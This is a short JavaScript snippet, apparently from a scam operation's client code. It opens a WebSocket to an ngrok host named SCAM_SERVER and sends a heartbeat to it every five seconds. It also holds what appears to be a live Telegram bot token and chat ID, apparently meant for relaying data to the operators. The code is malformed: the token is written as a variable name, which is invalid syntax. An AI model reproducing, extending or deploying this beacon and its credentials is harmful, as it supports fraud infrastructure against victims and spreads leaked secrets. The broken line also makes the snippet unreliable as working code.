const SCAM_SERVER = "wss://b0ed-41-96-9-150.ngrok-free.app";  // Use secure WebSocket URL
const 8001637745:AAHoM9PCHgiKlJp466D7g7mksDo5iAnb5jM = "SCAM_BOT_TOKEN";
const TELEGRAM_CHAT_ID = "8059448119";
const socket = new WebSocket(SCAM_SERVER);

socket.onopen = () => {
    console.log("WebSocket connected!");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
};

socket.onerror = (error) => {
    console.error("WebSocket Error:", error);
};
